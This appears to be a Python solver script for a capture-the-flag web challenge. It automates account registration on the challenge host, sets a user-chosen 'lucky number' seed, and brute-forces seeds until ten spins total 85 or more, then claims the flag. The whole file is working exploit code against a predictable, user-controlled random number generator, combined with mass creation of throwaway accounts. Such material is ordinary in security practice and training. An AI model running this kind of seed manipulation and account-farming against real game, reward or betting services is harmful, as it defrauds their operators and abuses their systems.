import requests, sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

base = 'https://web-random-cheese.tracebash.xyz'

s = requests.Session()
s.post(f'{base}/register', data={'username':'hack010','password':'hack010'})
s.post(f'{base}/login', data={'username':'hack010','password':'hack010'})

# First, get current lucky number
r = s.get(f'{base}/settings')
# Already know it's 937

# Try different lucky numbers to see which gives high scores
best_score = 0
best_seed = None
for seed in [1, 2, 10, 42, 100, 500, 666, 777, 888, 937, 999, 1000]:
    s2 = requests.Session()
    name = f'hack{seed}'
    s2.post(f'{base}/register', data={'username': name, 'password': name})
    s2.post(f'{base}/login', data={'username': name, 'password': name})
    
    # Update lucky number
    r = s2.post(f'{base}/update_lucky', data={'lucky_number': str(seed)})
    
    # Do 10 spins
    total = 0
    ok = True
    for i in range(10):
        r = s2.post(f'{base}/spin')
        if r.status_code != 200:
            ok = False
            break
        try:
            data = r.json()
            total += data['val']
        except:
            ok = False
            break
    
    if ok and total > best_score:
        best_score = total
        best_seed = seed
    
    if total >= 85:
        print(f'FOUND WINNING SEED: {seed} with total={total}')
        # Claim!
        r = s2.post(f'{base}/claim')
        if 'flag' in r.text.lower():
            for line in r.text.split('\n'):
                if 'flag' in line.lower() or 'ctf' in line.lower() or 'congratulations' in line.lower():
                    print(f'Line: {line.encode("ascii", errors="backslashreplace")}')
        break
    
print(f'Best so far: seed={best_seed}, total={best_score}')

# Also try to brute more systematically
# Check lucky number impact
for seed in [997, 998, 999, 1000]:
    s2 = requests.Session()
    name = f'hack{seed}'
    s2.post(f'{base}/register', data={'username': name, 'password': name})
    s2.post(f'{base}/login', data={'username': name, 'password': name})
    r = s2.post(f'{base}/update_lucky', data={'lucky_number': str(seed)})
    vals = []
    for i in range(10):
        r = s2.post(f'{base}/spin')
        vals.append(r.json()['val'])
    total = sum(vals)
    print(f'Seed {seed}: spins={vals}, total={total}')
    if total >= 85:
        print(f'WINNING SEED: {seed}')
        r = s2.post(f'{base}/claim')
        print(r.text[:2000])
        break